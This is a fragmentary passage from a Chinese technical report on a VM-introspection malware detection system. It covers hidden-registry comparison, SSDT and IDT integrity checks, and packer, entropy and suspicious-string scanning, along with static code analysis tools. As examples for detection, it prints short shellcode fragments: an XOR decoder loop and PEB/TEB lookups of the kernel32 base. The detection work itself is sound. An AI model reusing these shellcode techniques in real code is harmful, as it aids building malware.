精確的狀態資訊。 
  
運行目標前 
運行目標 
運行目標後 
記憶體狀態 1 
記憶體狀態 2 
比較分析 
 235 
 
身相關檔案隱藏之行為。 
圖表 4-47  檔案隱藏偵測流程 
 
  
將待測檔案送入虛擬機器 
執行待測程式 
暫停虛擬機器，並且快照 
取得快照內的檔案資訊 
(修改的檔案資訊) 
是否有檔案無法
在虛擬機器內部
查詢得到 
該程式有隱藏檔案之能力 該程式沒有隱藏檔案 
是 否 
 237 
 
改後的機碼系統會將使用者點擊之檔案當作 sirc32.exe惡意程式之命令列參數並
執行 sirc32.exe 而非使用者所預期的原可執行檔。因此，除啟動項外，我們也將
針 對 檔 案 關 聯 的 登 錄 檔 項 目 進 行 分 析 檢 測 ， 以 下 項 目 分 別 設
定.exe、.ini、.com、.txt、.bat、.inf 等副檔名之檔案其關聯程式： 
CLASSES_ROOT\exefile\shell\open\command 
CLASSES_ROOT\inifile\shell\open\command 
CLASSES_ROOT\comfile\shell\open\command 
CLASSES_ROOT\txtfile\shell\open\command 
CLASSES_ROOT\batfile\shell\open\command 
CLASSES_ROOT\inffile\shell\open\command 
本系統將在執行受檢測檔案執行前後兩個時間點，於 host OS 端透過 hivetool
直接從虛擬硬碟上存放系統登錄檔之檔案進行解析，觀察是否執行前後有產生
新的機碼值，並於執行後的同一時間點 guest OS 內部透過 Win32 API 列舉上述
之登錄檔項目，並與 host OS 端之紀錄比對，若存在機碼項目只於 host OS 端的
紀錄可見，則該受檢測檔案可能為惡意程式，詴圖隱藏部份登錄檔以隱蔽其行
為。 
本項技術主要採用虛擬機器內外比對之不同，找出惡意程式是否有隱藏登錄
檔之行為。由於惡意程式多會修改登錄檔以常駐在系統內部。為了避免被發現，
又會去竄改登錄檔案的相關系統函式，讓其修改不易發現。而這項修改勢必要
寫入到硬碟內才會在下次啟動時被系統載入至記憶體。藉著這項發現，我們可
以知道硬碟上的登錄檔案內容與在系統內部查詢的資料會不一致。所以，本系
統實作出同時查詢內部與外部的登錄檔資訊，來比對檢查是否差異之處。內部
是直接透過系統函式查詢，該系統函式可能受到竄改而提供不真實的資訊。外
 239 
 
圖表 4-49 偵測登錄檔隱蔽式修改之流程圖 
 
(a) VM 內部取 Reg info. [WinReg.exe] 
本節將針對內部登錄檔資訊截取做介紹。首先會簡介其運作的概念原理，並
且加上流程說明。最後有程式碼的說明註解。 
為了找出被隱藏起來的機碼，需要有個能比較的對象，當從內外對照發現有
不同時，就代表有一邊有東西看不到，這樣就可以知道哪些機碼是被隱藏的。
因此從VM內部取得登錄檔的資訊時，採取直接透過 Windows API來取得資訊，
不用其他特別的方式來詴圖找出隱藏的機碼，只要列出想要取得的機碼資訊就
可以了。要取得的機碼包括開機啟動項及一些常見的檔案關聯等。 
 241 
 
以下為取得虛擬機器內部登錄檔資料之完整程式碼： 
#include <windows.h> 
#include <stdio.h> 
#include <tchar.h> 
#include <string.h> 
 
#define MAX_KEY_LENGTH 255 
#define MAX_VALUE_NAME 16383 
#define MAX_DATA_LENGTH 32767 
#define PRE_DEFINE_KEY_TYPE 5 
 
LPTSTR win2unixPath( LPTSTR path ) // Convert win path to unix-like path, return 
path buffer pointer 
{ 
  DWORD i, leng; 
  
  leng = _tcslen( path ); 
  
  for( i = 0; i < leng; ++i ) { 
    if( path[i] == '\\' && path[i+1] != '/')  path[i] = '/'; 
  } 
  return path; 
} 
 
LPTSTR slashEscape( LPTSTR key, DWORD initial ) 
{ 
     DWORD  i, j; 
     DWORD  leng = _tcslen( key ); 
  TCHAR tmpKey[MAX_KEY_LENGTH] = {0}; 
  
  _tcscpy( tmpKey, key ); 
     memset( key, 0, MAX_KEY_LENGTH ); 
 
     i = 0; 
     j = 0; 
     while( i < leng ) { 
   if( tmpKey[i] == '/' ) { 
    key[j] = '\\'; 
 243 
 
    FILETIME ftLastWriteTime;         // last write time  
 
    DWORD i, j, retCode; 
 
    TCHAR  subValue[MAX_VALUE_NAME];  
    DWORD  mxValue = MAX_VALUE_NAME;  
 
    // Get the class name and the value count.  
    retCode = RegQueryInfoKey( 
        hKey,                    // key handle  
        className,               // buffer for class name  
&szClassName,            // size of class string  
        NULL,                    // reserved  
&numSubKeys,             // number of subkeys  
&lenMaxSubKey,           // longest subkey size  
&lenMaxClass,            // longest class string  
&numValues,              // number of values for this key  
&lenMaxValue,            // longest value name  
&lenMaxValueData,        // longest value data  
&szSecurityDescriptor,   // security descriptor  
&ftLastWriteTime);       // last write time  
 
     // Enumerate the key values.  
    if ( numValues )  
    { 
        for (i=0, retCode=ERROR_SUCCESS; i < numValues; i++)  
        {    
            mxValue = MAX_VALUE_NAME;  
            subValue[0] = '\0';  
            if( (retCode = RegEnumValue(hKey, i, subValue, &mxValue, NULL, 
&type, data, &lenMaxData)) == ERROR_SUCCESS ) { 
 
 
                _tprintf( _T ("%s/"), full  ); 
                if( strlen(subValue) == 0 ) 
                    _tprintf( _T("\\0 ")); 
                else 
                    _tprintf( _T ("%s "), slashEscape(subValue, 0) );     
 
 245 
 
        } 
    }  
 
} 
 
int _tmain( int argc, LPTSTR argv[] ) 
{ 
  HKEY phKey; 
  BOOL recTraverse; 
  int i; 
  int argKey; 
  TCHAR path[0x1000] ={0}; 
  
  LPTSTR mainKey, subKey; 
 
  LPTSTR preDefKeyName[PRE_DEFINE_KEY_TYPE] = { 
  _T ("HKEY_CLASSES_ROOT"), 
  _T ("HKEY_CURRENT_USER"), 
  _T ("HKEY_LOCAL_MACHINE"), 
  _T ("HKEY_USERS"), 
  _T ("HKEY_CURRENT_CONFIG") 
  }; 
  
  HKEY preDefKey[PRE_DEFINE_KEY_TYPE] = { 
  HKEY_CLASSES_ROOT, 
  HKEY_CURRENT_USER, 
  HKEY_LOCAL_MACHINE, 
  HKEY_USERS, 
  HKEY_CURRENT_CONFIG 
  }; 
 
  /* Check for execution arguments */ 
  if( argc == 2 ) { 
   recTraverse = 0; 
   argKey = 1; 
  } 
  else if( argc == 3 && _tcscmp( argv[1], _T ("-R") ) == 0 ) { 
   recTraverse = 1; 
   argKey = 2; 
 247 
 
 
     // 取出主要的 Key，也就是在登錄編輯器中可以看到最上
層的 Key 
     // 在之後的則是 subkey 
  mainKey = _tcstok( argv[argKey], _T ("\\") ); 
  subKey  = _tcstok( NULL, _T("") ); 
  
 
  // 接下來檢查要查詢的 Key 是否存在 
 
     // 若 key 存在，就去開啟他，當成功後先處理路徑，讓
Unix 可以看得懂，接著就去找出該 key 下的 subkey 和 value。
若有-R 參數則要用 Recursive 找出下面的所有內容 
  if( RegOpenKeyEx( preDefKey[i], subKey, 0, KEY_READ, 
&phKey) == ERROR_SUCCESS ) { 
   slashEscape( path, 1 ); 
   win2unixPath( path ); 
   traverseKey( phKey, 1, recTraverse , path  ); 
  } 
  
  RegCloseKey( phKey ); 
  return 0; 
} 
slashEscape 則是處理路徑，將原路徑的「/」轉成「\/」，「\」轉成「\\」。這樣一
來可以讓該字串在程式中使用。(程式中字串的表示「\」需要用「\\」)。win2Unix
則是將 Windows 路徑轉成 Unix 中支援的路徑，在 Windows 中路徑的分隔使用的
是「\」而 Unix 則是使用「/」，因此透過這個函數進行轉換。接著則是程式的主
 249 
 
 
                // 根據 value 的型態不同作不同的處理 
                switch( type ) { 
      case REG_SZ: 
      case REG_LINK: 
      case REG_EXPAND_SZ:       
           _tprintf( _T ("%s\n"), (LPTSTR)data );   
        break; 
      case REG_DWORD: 
         default: 
        for( j = 0; j < lenMaxData; ++j ) 
         _tprintf( _T ("%02x"), (DWORD)data[j] ); 
           _tprintf( _T ("[%d]\n") , lenMaxData ); 
        break; 
    } 
   memset( data, 0, MAX_DATA_LENGTH ); 
    lenMaxData = MAX_DATA_LENGTH; 
            } 
        } 
    }  
 
    // 列完 value，接著利用 RegEnumValue 這個 API，將其下的 subkey 列出來 
    if ( numSubKeys ) 
    { 
        for (i=0; i < numSubKeys; i++)  
        {  
            szName = MAX_KEY_LENGTH; 
            if( (retCode = RegEnumKeyEx( hKey, i, subKey, &szName, NULL, 
NULL, NULL, &ftLastWriteTime)) == ERROR_SUCCESS && 
                   
RegOpenKeyEx( hKey, subKey, 0, KEY_READ, &phKey) == ERROR_SUCCESS ) { 
                 strcat( path , "/" ); 
                 strcpy( path+1 , slashEscape(subKey, 0) ); 
                 _tprintf( _T ("%s/\n"), full ); 
            }    
 
            // 若有-R 參數，則利用 recursive 的方式將 subkey 下的東西也列
出來 
            if( recursive == 1 ) 
 251 
 
(b) VM 外部取 Reg info. [Hivetool] 
本章節將針對外部登錄檔資訊截取做介紹。首先會簡介其運作的概念原理，
並且加上流程說明。最後有程式碼的說明註解。hivetool 完成的工作是先擷取一
個 windows 登錄機碼的 hive 檔案，而這個 hive 檔案會有對應的登錄機碼路徑。
我們利用 hivetool 提供的函式來達到讀取特定登錄機碼的值。但由於此套件
(hivetool)仍在開發中，故有些地方需要加以修改，才能達到本計畫的目標。以
下將會詳細的解說程式碼修改的地方，並且有個整體的流程介紹。 
虛擬機器為了要正常的模擬系統的運作，會有模擬的硬碟空間。而這個模擬
硬碟的映像檔，就會包含存放著 Windows 登錄檔。但是我們無法直接去存取該
檔案，因為 NTFS 的檔案系統配置的時候可能會不連續，且檔案所在的磁區位
置、檔案大小等資訊皆無法從映像檔知道。所以要透過 Sleuth kit 來取得這些檔
案資訊。Sleuth kit 會先判斷該檔案系統，並且用相對應的檔案格式去取出該映
像檔所包含的內容。有了這些檔案相關資訊，我們即可將檔案取出。取出登錄
檔案之後，再用 hivetool 進行分析，把欲檢測的路徑底下之所有鍵值列出，以得
到外部之登錄檔資訊。 
 253 
 
以下為取得虛擬機器外部登錄檔資料之完整程式碼： 
 
程式一剛開始會進入 main 函式，並且提醒使用這要使用正確的參數。如果輸入
的參數 1是一個 hive檔案的話，而 hl_mount_list將會成功的把 hive檔掛載起來。
hl_mount_list 定義在 lib/libhive.c 裡，他提供了低階結構的解析，往後就可以利
用 hivetool 提供的函式庫來存取登錄機碼。而 ns_chdir 則是改變目前的登錄機碼
位置，本程式將會列出所有的登錄碼，故登錄碼路徑變更至 root "/"。而
cmd_recurse 函式將會呼叫 ns_recurse 函式，其用途是列舉所有指定登錄碼路徑
底下的所有鍵值，定義在 hivetools/nstdreg.c 中。由於上述介紹之原始碼過於龐
大(數千行)，所以不詳列在技術報告之中。如果要更深入的了解函式內容，可以
從本計畫繳交的系統原始碼參考。 
  
===========================bin/listhive2.c========================= 
int main(int argc , char** argv ){ 
char p[] = "/"; 
printf("safe0!!\n"); 
fflush(0); 
        if( 0 != hl_mount_list( argc-1  , &argv[1]  ) ) { 
fprintf(stderr, "hl_mount_list() had issues (%s),  \ 
I am going to continue...\n", 
                uerr_str( uerr_get() )); 
        } 
printf("safe1!!\n"); 
fflush(0); 
if( 0 != ns_chdir( p ) ) 
printf("Couldn't chdir to initial working directory %s: %s",\ 
    p, uerr_str( uerr_get() ) ); 
    cmd_recurse( ); 
} 
 255 
 
圖表 4-52 實作流程圖 
 
 
以下為實作程式碼說明： 
圖表 4-53 程式碼<1> 
 
圖表 4-54 程式碼<2> 
 
圖表 4-55 程式碼<3> 
 
179:  
印====MBR Modification Scanning ==== 
180:  
sh |-101 跳至往前算第 101 行的地方，即第 79 行的位置(180-101)，取得該處
的字串（qemucmd commit all）並執行 cmd4shell()來將它轉換成指令，並執
 257 
 
4.2.1 SSDT Hooking 
為了監控 SSDT 的完整性不被惡意軟體竄改，我們於 Guest OS 內部安插一
kernel-level driver 方便我們利用 KeServiceDescriptorTable 指標進一步取得 SSDT
實體記憶體位址，並由同樣位於 Guest OS 裡的 user-level 系統資訊收集程式負責
觸發該 driver。在受檢測的檔案尚未執行前的時間點 t0，我們先透過預先建立的
隱蔽溝通管道對收集程式下達命令進而觸發該 driver，待取得 SSDT 實體記憶體
位址後，再利用 QEMU 原有的功能將該記憶體區段匯出。接著執行受檢測的檔
案後，於時間點 t1 再次將該記憶體區段匯出，比較之下若存在差異，則受檢測
的檔案可能修改了 SSDT，有 hook 以行惡意行為之嫌疑。 
(a) Writing Kernel-Mode Drivers 
聽到 Driver 這個字，讓人聯想到非常低階的，用來控制底層某些硬體的細
微操作所使用的軟體，撰寫 Driver 似乎對程式設計者非常的不友善。實際上，
在 Windows 2000 之後的版本提供了分層架構(layered)的 Driver model，讓嘗詴撰
寫 Driver 的使用者，可以用類似於高階 user-mode 的 library 來操作硬體，並取
得高度的 CPU privilege level 做到複雜的工作。 
IOCTL(Device I/O Control) 是在寫 Driver 時常用的一個技巧，用來幫助
user-mode 的程式可以”遠端控制”。當一個在 user-mode 下的程式想存取
kernel-mode 下才能拿到的資源，IOCTL 就像是一座橋梁，用來幫助 user-mode
下的程式取得 kernel-mode 下的資源。 
 259 
 
圖表4-56 撰寫Driver時，Driver的進入點相當於main() (圖表引用自Undocumented Windows 2000 Secrets Chap 3 
Listing 3-1 p.124) 
 
3. 一些常見的Data Type如：BYTE、WORD、DWORD在寫kernel-mode 
driver時都不被使用，取而代之的是UCHAR、USHORT、ULONG。 
Kernel-mode Driver 的 main function: DriverEntry()會先建立一個 device object
及它的 symbolic link，並把 device object 存成 global 的變數。這個 device object
的內容在未來將會存放每個 request 所對應 driver 回傳的結果。Driver 收到的
request 會是一個 IRP(I/O Request Packet)。 
DriverEntry()會把所有收到的 IRP 統一交給 DriverDispatcher()處理，所以在
DriverDispatcher() 內會有使用者寫好的程式碼，針對需要的 IRP有個別的處理。 
(b) Service Control Manager 
一般的情況下，driver 都是在系統開機的時候才會被 load 到系統當中，但我
們不可能每次一更新 driver 之後就要重新開機才能 load。為此，Windows 2000
提供了 Win 32 的 interface：Service Control Manager。透過這個介面可以在 runtime 
時做到 driver load and unloading。 
Service Control Manager 可以處理服務 (service)和驅動程式 (driver)，SC 
Manager 的 interface 被實作在 Win 32 subsystem 中的 advapi32.dll。在可以存取服
務之前，必頇透過OpenSCManager()取得一個HANDLE，之後在CreateService()、
OpenService()時必頇有這個 HANDLE。 
圖表 4-57 常用的 SCManager 提供的 function (圖表引用自 Undocumented Windows 2000 Secrets Chap 3 Table 3-3 
 261 
 
圖表 4-58kernel-mode Driver part1 
 
  
 263 
 
圖表 4-60 user-mode 程式 part1 
 
  
 265 
 
圖表 4-62user-mode 程式 part3 
 
利用上述 user-mode 下的程式搭配 kernel-mode 的 Driver，我們可以繞過 Windows
對 SSDT 的保護，順利的取得 SSDT 的 Service Table。 
取得 SSDT 後，對我們想要檢查的、可能會修改系統核心的程式，在執行結
束後，透過上述的方法重新取得一次 SSDT，如此我們就可以知道想要檢查的程
式，執行前與執行後 SSDT 的差別。如果 SSDT 有所改變，那我們就可以判定這
隻程式會修改系統核心。因為我們是觀察在 QEMU 內 Guest OS 執行的程式，所
 267 
 
  
 269 
 
式前的 IDT；再來執行欲檢測的程式，執行完後一樣用 SIDT 指令拿到存在 IDTR
中 IDT的記憶體位址，至該記憶體位址拿到對應的 IDT，此為執行程式後的 IDT；
最後，比較兩個 IDT 的內容是不是相同，如果相同代表該程式為非惡意程式，
如果不同表示 IDT 已因該程式的執行被作了修改，為一惡意程式，可能對電腦
造成威脅。下列為函式 do_dump_idt()的程式碼 
 
 
  
 /* dump IDT from linear address idt.base 
   IDT_ENTRY_MAX_NUM =256，因 IDT 有 256 個 interrupt vectors */ 
 /*virtual memory access for debug*/ 
     /*idt.base 為 IDTR 中 IDT 的 base address*/ 
 cpu_memory_rw_debug( env, env->idt.base, buffer, IDT_ENTRY_MAX_NUM << 3, 0 ); 
 /*將 dump 出來的資料印(寫)入檔案(output_fname)中*/ 
 for( i = 0, idt_ptr = (uint32_t*)buffer; i < IDT_ENTRY_MAX_NUM; ++i, idt_ptr += 2 ) 
  fprintf( fp, "%08x %08x\n", *idt_ptr, *(idt_ptr+1) );//each time 寫入 8bytes 的資料 
 /*resume emulation*/ 
 do_cont(); 
 /*關閉檔案*/ 
 fclose( fp ); 
/*釋放空間*/ 
 free( buffer ); 
} 
 
 271 
 
在使用者端部分，要分析檔案格式以偵測其檔案類型，若為可執行檔則偵
測此檔案是否有經過加殼的保護，並且把上述步驟簡化以利使用者操作。這部
分所採用的方式是收集目前已知的各種檔案格式(如文件檔，可執行檔等)，並且
頇要了解其檔案格式之特徵碼，以利將來進行檔案格式的判讀，並且必頇要記
錄其檔案格式的副檔名。 
可疑字串分析 
找尋包含在檔案內的字串，檢查是否有包含較敏感的資訊。由於檔案行為
很難直接判定是否為惡意。但若檔案的行為理應簡單而可預知，例如：影片、
Office 文件、小遊戲…等，但卻檢查出有包含可疑的字串格式，雖有可能本身
沒有包含惡意行為，但也有可能為首頁綁架、惡意軟體下載器等間接的木馬程
式。我們實作了可疑字串檢查模組，將能找出類似可疑的字串，協助我們對檔
案的判斷。透過檔案指標傳遞，讓此分析模組取得欲檢測之檔案。經過每位元
組位移的掃描方式，可以確定該檔是否有符合的可疑字串。利用正規表示法的
特徵來找出事先設定的字串。為了往後的擴充性，設定檔是獨立出來的，供使
用者往後可以針對不同的檔案內容特徵做檢查。 
此部分將以正規表示式(Regular Expression)檢查檔案中是否含有可疑的字
串片段，檢查項目包括： 
IP。如 140.113.1.1、72.65.11.101 
URI。如 http://www.hinet.net、ftp://fadsaf.dsafdsaf.dsafdsa 
Windows UNC Path。如 c:\windows\、d: 
Linux Path。如/usr/bin、/bin/sh 
iframe tag。如<iframe…………</iframe> 
 273 
 
外部導入函式庫可以被目標程式使用，換句話說，該程式將透過系統所提
供的函式來達到程式目標。Windows 為了方便程式開發者撰寫系統程式，提供
了許多強大的函式庫。而其中有許多可以管理程序、執行緒，或是讀取其他程
式記憶體的函式。攻擊者常會利用這些功能較特殊的外部函式來達到攻擊的手
法，例如：Keystroke 以騙取帳號密碼、複製惡意程式、開啟主機後門等。若使
用者能夠事先知道下載檔案是否載入較可疑的函式，就能夠避免被騙取執行。 
加殼掃描 
透過特徵值(Signature-based)比對來得知該檔案是否為加殼檔案。由於加殼
程式無法從執行檔內的檔案內容得知指令，所以很難被靜態分析。透過改變程
式順序或替換數值來混淆鑑識人員以保護自身不被破解。利用已知的加殼技術
來分析目標檔案是否有加殼的行為。其判斷手法可分為兩步驟進行分析：一）
已知特徵值比對、二）資訊熵(Entropy)分析。首先，將比對是否為已知的加殼手
法。由於加殼程式為了正確地解殼，會在檔案特定的位置留下特徵碼以供加殼
程式判斷，藉由該特徵碼可以初步的判斷該檔案是否為加殼程式。若未符合任
何一種已知的特徵值，將進行下一步的分析。第二部分資訊熵分析請見下節。 
程式區段資訊熵分析 
Entropy 乃是一個統計分析的分析技術，其主要的概念是回報一個檔案中內
容的亂度。其實作方式就是統計每個字元的出現次數，算出其機率 p(i)之後，再
對每個字元計算 
 275 
 
極有可能是惡意程式。在模擬執行的過程中，分析程式將監測所有的記憶體讀
取動作，當從記憶體中讀取出的值符合當初壓入堆疊的特殊值時，即代表偵測
出一個 Call/Pop 序列。 
 
以上為一簡單的 shellcode 程式碼中一開始的部分，在 01 行時進行 call 跳到
12 行的 code4 的位置，真正做 Call/Pop 的地方則是從 13 行的 call code2 跳回 02
行後接下來 03 行馬上執行 pop ebx，就可把剛剛 13 行的 call 所推進堆疊中的記
憶體位址讀取出來，我們的分析程式能夠抓到這樣的行為。 
掃描 PEB/TEB/SEH Loading 
 惡意程式為了要對系統進行破壞，必頇呼叫 Win32 的 API，而要得到這
些 API 的位址，最常用的方法是透過 FS 暫存器中的 SEH,TEB, PEB 這三個資料
結構來達成目標。 
本分析程式的做法是將這三個資料結構所在位址填入特殊的值，即在
Example: 
01 jmp  code4 
02 code2:                
03 pop  ebx     
04 xor  ecx,ecx     
05 mov  eax, 090909090h     
06 code1: 
07 xor  dword ptr [ebx+ecx*4], eax  
08 inc  cx   
09 cmp  cx, 03ah              
10 jl   code1                 
11 jmp  code3  
12 code4: 
13 call code2 
14 code3: 
 277 
 
 
以上為一簡單 shellcode 利用 PEB Loading 取得 Kernel32.dll 的位址的實例，
02 行會去將 FS:[030h]讀出來，當我們的分析程式發現記憶體讀取的值是我們當
初定義好，預先填入 FS:[0x30]的特殊值，便會發現這個檔案有 PEB Loading 的
行為。 
 
以上為一簡單 shellcode 利用 TEB Loading 取得 Kernel32.dll 的位址的實例，在
02 行的地方 fs :[ esi + 0x18 ]讀到 esi，即將 TEB 的值讀出，讀取的時候會被我們
的分析程式發現到它讀的是我們預先定義給 TEB 的值，便可抓到此受測檔案有
TEB Loading 的行為。 
  
Example3 (TEB Loading): 
01 xor esi , esi 
02 mov esi , fs :[ esi + 0x18 ] // TEB 
03 mov eax , [ esi + 4 ]  
04 mov eax , [ eax - 0x1c ] // 指向 Kernel32.dll 内部 
05 find_kernel32_base : 
06 dec eax // 開始地毯式搜索 Kernel32 空間 
07 xor ax , ax 
08 cmp word ptr [ eax ], 0x5a4d // "MZ" 
09 jne find_kernel32_base // 一直搜到找到則返回 eax 
 
Example2 (PEB Loading): 
01 xor eax,eax 
02 mov eax,dword ptr FS:[030h] 
03 mov eax,DWORD PTR [eax+0ch] 
04 mov esi,DWORD PTR [eax+01ch] 
05 lodsd 
06 mov eax,dword ptr [eax+8h] 
 
 279 
 
洞存在，如以 C 語言的 strcpy(dest, src)函式，所設定的限制就是 src 的實際長度，
不得超過 dest 被分派的大小。另一個常見例子則是陣列索引(index)邊界檢查，
靜態分析可判定索引範圍值，如有超過陣列邊界的可能性，則有安全漏洞產生。
限制規則的表示則根據判斷限制條件的演算法而定。 
實作方面，可將上述問題轉換成整數範圍的限制(Integer Range Constraint)，
以圖論(Graph-Theoretic)的技巧去建構演算法解決。例如： 
int a = rand()%7;                 Range[a]=0~6 
int b = a*3+2;                     Range[b]=2~20 
char dest[10];                     Range[dest]=0~9 
char *src = (char *)malloc(b);  Range[src]=2~20 
strcpy(dest,src); 
MINRange[src]<Range[dest]<MAXRange[src] 
                       (Range constraint violation) 
 
• 程式流程分析(Flow-based Analysis) 
程式流程分析的目標是在於產生程式碼內，或程式碼與程式碼間程式流
(Control-flow)與資料流(Data-flow)的相關訊息，包括資料狀態與程式流向，多數
的工具會採用有向圖(Directed graph)做為模擬程式的資料結構，其有方向性的邊
(Edge)代表程式或資料流向，節點(Node)則代表與安全相關的程式碼或資料狀態，
藉此模擬程式的行為及進行驗證。 
在程式安全應用方面，汙染分析(Taint Analysis)標記攻擊者可控制的資料為
被汙染資料(tainted data)，再針對被汙染資料進行資料流分析，以得知不安全資
料是否接觸程式潛在安全漏洞。汙染分析中資料流定義分為汙染來源(source)、
 281 
 
模組化檢查(Model checking)將不安全程式行為以有限狀態自動機 (finite 
state automata,FSA)為模組化依據，例如 C 語言於 Unix 環境中 seteuid(0)取得 root
權限，接著又執行 execl()使用特權指令，導致系統控制權被搶奪，此類行為可用
以下 FSA 模組表示： 
圖表 4-66FSA Model 
 
將此類漏洞特徵模組化，控制流分析即為模組化檢查的實作方式，藉以找
出潛藏的安全漏洞。 
  
 283 
 
測範圍，以獲得更多安全漏洞資訊，對檢測準確率方面也需考量，因此大幅增
加執行時間。如何在不減少準確率的前提下增加搜尋規模，使執行時間又在容
許範圍內，是實作上重要課題。 
準確率、分析時間、與搜尋規模，此三方向均有高度關聯性，設計原始碼靜態
分析工具時，頇做嚴謹的驗證與方法分析，在此三方面做良好帄衡。 
  
 285 
 
系統架構如下圖： 
圖表 4-67 系統架構圖 
 
系統運作流程如下，分析人員指定待測檔案後，系統先檢查分析檔案類型
( C/C++/PHP/Java/VB.NET )，隨後執行相對應的靜態分析工具，各項工具的分析
結果檔案再透過 Report Analyzer 進行整理，最後的分析結果以 GUI 介面或書面
報表方式呈現。分析帄台除提供四項靜態原始碼安全分析工具的整合檢測功能
外，還有分析專案功能幫助使用者儲存分析組態，如檢測語言、檢測目標、選
用工具。 
因各項工具檢測結果無論在格式、內容敘述上不盡相同，我們頇定義統一
的報告表示格式，將個別的檢測報告轉換為單一格式，這也是 Report Analyzer
的主要工作。對於各項工具，均有相對應的 Report parser 負責擷取各工具報告
資訊，並將資訊存入相對應的資料結構，系統再讀取資料結構，將報告顯示於
GUI 互動介面，或在使用者按下儲存鍵後，輸出 HTML 格式書面報告。 
 287 
 
4.2.7 工具回報準確率與危險層級評估 
整合分析帄台建置的另一大重點是，制定各分析工具準確率評估標準，由於各
工具分析能力不一，可能產生誤判(false positive)或未檢出(false negative)情況，
當各工具回報安全漏洞議題時，可能情況分為二類，(1)實際具有安全漏洞，及(2)
誤判情況，對此可以條件機率表示”當工具回報漏洞時，其為確切漏洞之機率”，
公式如下： 
 
𝑃( 𝑒𝑎𝑙_𝑣𝑢𝑙𝑛 | 𝑑𝑒 𝑒𝑐  ) 
= 
𝑃( 𝑒𝑎𝑙_𝑣𝑢𝑙𝑛 ∩ 𝑑𝑒𝑡𝑒𝑐𝑡)
𝑃(𝑑𝑒𝑡𝑒𝑐𝑡)
 
                        = 
𝐵𝐶−𝐹𝑁 
𝐵𝐶+𝐺𝐶
𝐹𝑃+(𝐵𝐶−𝐹𝑁)
𝐵𝐶+𝐺𝐶
 
                        = 
𝐵𝐶−𝐹𝑁
𝐹𝑃+(𝐵𝐶−𝐹𝑁)
 
 
其中 real_vuln 代表確切漏洞、detect 表工具回報漏洞、BC 為 bad case 數量、GC
為 good case 數量、FN 表 false negative 數量、FP 表 false positive 數量。根據此
公式，我們可由樣本測詴結果得知各工具對特定議題的回報準確率。 
”工具回報準確率”的含意為，當檢測工具回報安全漏洞議題時，其議題正確程度，
和一般分析各檢測工具效能指標有所不同。當某項工具對特定議題檢測能力薄
弱時，此工具回報該議題的可能性本身極低；而當檢測能力較高時，工具回報
可能性大增，此時分為二種情況，一為工具誤判率高，根據條件機率公式可知
 289 
 
4.2.8 原始碼整合分析工具－各項工具介紹 
以下將一一介紹於我們建置的原始碼靜態分析帄台中，各項選用的靜態分
析工具，包含前一年度計畫採用的 CBMC、支援多種語言的檢測工具 YASCA、以
VB.NET 為主的檢測工具 FxCop 以及著名的商業軟體 Fortify SCA。 
CBMC(Univ. of Carnegie Mellon) 
CBMC 是針對 ANSI-C 程式的邊界模型偵測器(Bounded Model Checker)。其可
偵測出陣列邊界問題(array bounds or buffer overflows)、指標安全性(pointer 
safety)、例外(exceptions)及不當的使用者定義(user-specified assertions)。此外，
它亦可測詴 ANSI-C、C++對其他語言的一致性，例如 Verilog。這項功能藉由將程
式裡的迴圈展開 (unwinding the loops)並將結果傳遞給判斷程序 (decision 
procedure)來完成。 
迴圈展開方式如下：(1) 對於 while 迴圈，將每個迴圈迭代(loop iteration)拆
解成 if 敘述(statement)，(2) 對於巢狀(nested) while 迴圈，以 switch 敘述拆解內
層迴圈，並新增一個變數決定檢查內層敘述或外層敘述。迴圈展開的虛擬碼如
下： 
 
情況(1)： 
while (e) 
<stmt> 
if (e) { 
<stmt> 
 291 
 
針對 QA 測詴及安全漏洞偵測。YASCA 藉由整合許多的開放原始碼檢測工具，包
含 FindBugs、PMD、JLint、JavaScript、PHPLint、CppCheck、ClamAV、RATS 與 Pixy
等八項檢測工具，以達到較為全面的掃描分析，而 YASCA 也提供多種的輸出文
件格式，包含 HTML、XML 與 CSV 等等格式。YASCA 其針對於檢測撰寫樣式問題
(coding style)、死結問題(dead lock)或執行緒相關問題(thread issue)等等，具較好
的檢測能力。 
FxCop (Microsoft Inc.) 
FxCop 是由 Microsoft 提供，對.NET managed code assembly 檢測的原始碼靜
態分析工具，主要用來分析以.NET 技術開發的 managed code assembly 品質，也
包括 26 項屬於”安全性警告”類別的議題，可幫助使用者撰寫支援.NET 技術的程
式 (C#, VB.NET,…)時，更能注意和語法結構、函式庫等等有關的安全性要素。FxCop
對.NET 安全性議題可偵測項目共 28 項，列表如下： 
表格 4-16FxCop 對.NET 安全性議題 
Aptca methods should only call aptca methods 
Aptca types should only extend aptca base types 
Array fields should not be read only 
Call GC.KeepAlive when using native resources 
Catch non-CLSCompliant exceptions in general handlers 
Do not declare read only mutable reference types 
Do not indirectly expose methods with link demands 
 293 
 
Static constructors should be private 
Type link demands require inheritance demands 
Wrap vulnerable finally clauses in outer try 
 
Fortify SCA (Fortify Inc.) 
商業軟體方面，我們將焦點集中於 Fortify SCA(Fortify Software Inc.)：Fortify 
SCA (source code analyzer)結合資料流分析  (data-flow analysis)、控制流分析 
(control-flow analysis)、語意分析  (semantic analysis)、結構分析  (structural 
analysis)、配置分析 (configuration analysis)，以下逐一介紹。 
1. 資料流分析(data-flow analysis)： 
偵測含有被汙染資料 (tainted data－使用者控制的輸入)潛在的危險性使用
之潛在漏洞。使用全域、程序性感染的散播分析，在 source (使用者輸入位置)
和 sink (危險函式的呼叫或操作)之間偵測資料流動。例如－偵測由使用者控制且
沒有限制輸入長度的字串，是否正被複製到有長度規定的緩衝區  (buffer 
overflow)，或偵測由使用者控制的字串是否正被用來建構 SQL 查詢文字。 
2. 控制流分析(control-flow analysis)： 
偵測危險的作業順序。可分析程式中的控制流路徑，以判定一系列的操作
是否以一種特定的順序執行。例如：控制流分析器會偵測問題與未初始化變數
的檢查時間/使用時間，並檢查 XML 閱讀器等公用程式是否已正確配置。 
 295 
 
此需求，Fortify SCA 提供使用者自訂安全程式規則撰寫功能，透過此介面，使用
者能在預設的 5 種分析模式上，標識具有危險性的特定函式或類別，再由資料
流、語意分析等模式，找出額外安全性危險議題。自訂規則的撰寫，可針對不
同類型安全漏洞採取不同偵測模式，幫助程式開發人員更精準掌握安全漏洞可
能發生位置，加強 Fortify SCA 檢測能力。 
自訂程式安全規則必頇遵循 Fortify SCA 現有分析模式規則，在其中增加新
的不安全函式定義，或描述不安全程式行為模型，又預設安全規則已包括大部
分程式安全漏洞。因此，自訂程式安全規則僅可加強第三方協力函式庫
(third-party APIs)、及私領域函式庫，函式(或方法)為自訂規則標識基本單位。 
  
 297 
 
